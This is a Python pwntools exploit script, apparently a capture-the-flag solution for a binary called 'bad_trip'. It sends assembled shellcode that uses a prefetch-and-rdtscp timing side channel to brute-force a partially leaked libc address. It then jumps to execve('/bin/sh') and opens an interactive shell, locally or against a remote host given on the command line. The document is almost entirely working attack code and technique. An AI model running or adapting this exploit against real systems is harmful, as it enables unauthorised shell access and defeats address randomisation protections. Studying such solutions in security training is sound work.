#!/usr/bin/python3

from pwn import *
import sys
from os import system
from ctypes import CDLL

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "INFO"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./bad_trip"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
break *exec+71
'''

libcx = CDLL("libc.so.6")
# now = int(floor(time.time()))
# libcx.srand(now)
# print(libcx.rand())

def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def unpack_ptr(ptr):
    if (len(ptr) < 8):
        ptr += (8 - len(ptr)) * b"\x00"
    return (u64(ptr))

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def read_payload(leak):
    filename = "exp.s"
    payload = ""
    fpay = open(filename, "r")
    flines = fpay.readlines()

    for line in flines:
        payload += line.replace("0x69696969", str(hex(leak))).replace("\t", "")

    print(payload)
    return (payload)

def exploit():
    baseaddr= 0x1337131000
    writableaddr = 0x6969696000
    starting_index = 0x7000
    log.info("alright")
    partial_leak = int(pp.recvline().split()[-1].replace(b"0x", b""), 16)
    print(f"partial_leak -> {hex(partial_leak)}");
    pp.recvuntil(b">> ")
    
    log.info("sending the payload")
    pay = asm(
                f"mov rsp, {writableaddr + 0x1000};"
                # f"mov rbp, {writableaddr + 1500};"
                f"mov r8, {starting_index};"
                "mov r12, 0;"
                "mov r13, 1;"
                "jmp _bruteforce;"

                "_bruteforce :"
                    "cmp r8, 0x8000;"
                    "je _ok;"
                    f"mov r11, {partial_leak};"
                    "call _assemble_addr;"
                    "call _rdtscp;"
                    "mov rsi, rax;"
                    "prefetcht2 [r11];"
                    "prefetcht2 [r11];"
                    "prefetcht2 [r11];"
                    "prefetcht2 [r11];"
                    "prefetcht2 [r11];"
                    "prefetcht2 [r11];"
                    "prefetcht2 [r11];"
                    "prefetcht2 [r11];"
                    "prefetcht2 [r11];"
                    "prefetcht2 [r11];"
                    "prefetcht2 [r11];"
                    "prefetcht2 [r11];"
                    "prefetcht2 [r11];"
                    "prefetcht2 [r11];"
                    "prefetcht2 [r11];"
                    "prefetcht2 [r11];"
                    "prefetcht2 [r11];"
                    "call _rdtscp;"
                    "mov rbx, rax;"
                    "mov r10, rbx;"
                    "sub r10, rsi;"
                    "add r12, r10;"
                    "mov rax, r13;"
                    "imul rax, rax, 30;"
                    "xor rdx, rdx;"
                    "mov rcx, 100;"
                    "div rcx;"
                    "cmp r10, rax;"
                    "jl _ok;"
                    "int3;"
                    "add r8, 1;"
                    "mov rcx, r8;"
                    f"sub rcx, {starting_index};"
                    "mov rax, r12;"
                    "xor rdx, rdx;"
                    "div rcx;"
                    "imul rax, rax, 2;"
                    "cmp rax, r10;"
                    "jl _bruteforce;"
                    "mov r13, r10;"
                    "jmp _bruteforce;"
                "_assemble_addr :"
                    "mov rdi, r8;"
                    "sal rdi, 32;"
                    "or rdi, r11;"
                    "mov r11, rdi;"
                    "ret;"
                "_rdtscp :"
                    "rdtscp;"
                    "shl rdx, 32;"
                    "or rax, rdx;"
                    "ret;"
                "_ok :"
                    "mov rax, r11;"
                    f"sub rax, {libc.sym.puts};"
                    "mov rdi, rax;"
                    f"add rdi, {next(libc.search(b'/bin/sh\x00'))};"
                    "mov rsi, 0;"
                    "mov rdx, 0;"
                    "mov r8, rax;"
                    f"add r8, {libc.sym.execve};"
                    "jmp r8;"
                    "ret;"
        ,vma=0x1337131000)
    log.info(f"payload len {len(pay)}")
    pp.sendline(pay)
    pp.interactive()
    

if (args.REMOTE):
    libc = ELF("./libc.so.6")
else:
    libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
